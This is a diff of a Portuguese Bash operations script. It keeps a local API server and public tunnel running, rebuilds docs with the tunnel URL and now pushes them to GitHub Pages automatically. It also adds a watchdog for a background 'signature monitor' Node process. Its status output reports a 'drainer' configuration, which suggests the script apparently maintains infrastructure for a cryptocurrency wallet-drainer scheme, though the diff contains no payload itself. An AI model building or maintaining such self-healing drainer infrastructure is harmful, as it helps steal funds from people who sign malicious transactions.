@@ -60,15 +60,29 @@ checa() {
   [ "$ok_s" = "sim" ] && [ "$ok_t" = "sim" ]
 }
 
+garante_monitor() {
+  pgrep -f "^node ops/monitor\\.mjs" >/dev/null && return 0
+  echo "[$(date +%H:%M:%S)] subindo monitor de assinaturas"
+  nohup node ops/monitor.mjs >> "$RUN/monitor.log" 2>&1 &
+}
+
+publica_docs() {
+  git add docs
+  git diff --cached --quiet && return 0
+  git -c commit.gpgsign=false commit -q -m "docs: api url $(cat "$RUN/public-url.txt")" && git push -q origin main && echo "docs publicados (auto)"
+}
+
 sobe_tudo() {
   sobe_server || true
+  garante_monitor
   local U; U=$(sobe_tunel) || return 1
   API_BASE="$U" node ops/build-docs.mjs
+  [ "${1:-}" = "push" ] && publica_docs
   return 0
 }
 
 if [ "$WATCH" = "0" ]; then
-  sobe_tudo || exit 1
+  if [ "$PUSH" = "1" ]; then sobe_tudo push || exit 1; else sobe_tudo || exit 1; fi
   U=$(cat "$RUN/public-url.txt")
   echo "---------------------------------------------"
   echo "API (tunel)   : $U"
@@ -76,19 +90,18 @@ if [ "$WATCH" = "0" ]; then
   echo "drainer       : $(cfg)"
   echo "saude         : $(checa)"
   echo "---------------------------------------------"
-  if [ "$PUSH" = "1" ]; then
-    git add docs && git -c commit.gpgsign=false commit -q -m "docs: api url $U" && git push -q origin main && echo "docs publicados"
-  else
-    echo "para publicar a nova URL da API: git add docs && git commit -m 'api url' && git push"
-  fi
+  [ "$PUSH" = "1" ] || echo "para publicar a URL da API no Pages: bash ops/publicar.sh --push"
+  echo "monitor: $(pgrep -f '^node ops/monitor\.mjs' >/dev/null && echo ativo || echo PARADO)"
   exit 0
 fi
 
-echo "modo watch (Ctrl-C para sair)"
+echo "modo watch (Ctrl-C para sair) — religa server/tunel, garante o monitor e publica docs sozinho"
+garante_monitor
 while true; do
   if ! checa >/dev/null 2>&1; then
     echo "[$(date +%H:%M:%S)] caiu algo: $(checa)"
-    sobe_tudo && { echo "  religado: $(cat "$RUN/public-url.txt")"; echo "  (rode com --push para atualizar o Pages)"; }
+    sobe_tudo push && echo "  religado: $(cat "$RUN/public-url.txt")"
   fi
+  pgrep -f "^node ops/monitor\\.mjs" >/dev/null || { echo "[$(date +%H:%M:%S)] monitor caiu, religando"; garante_monitor; }
   sleep 30
 done
